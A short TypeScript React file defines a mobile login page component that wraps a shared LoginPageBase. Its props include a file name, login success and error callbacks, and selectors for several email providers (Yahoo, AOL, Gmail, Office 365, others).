import React from 'react';
import LoginPageBase from '../LoginPageBase';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  defaultProvider?: string;
}

const MobileLoginPage: React.FC<LoginPageProps> = (props) => (
  <LoginPageBase variant="mobile" {...props} />
);

export default MobileLoginPage;
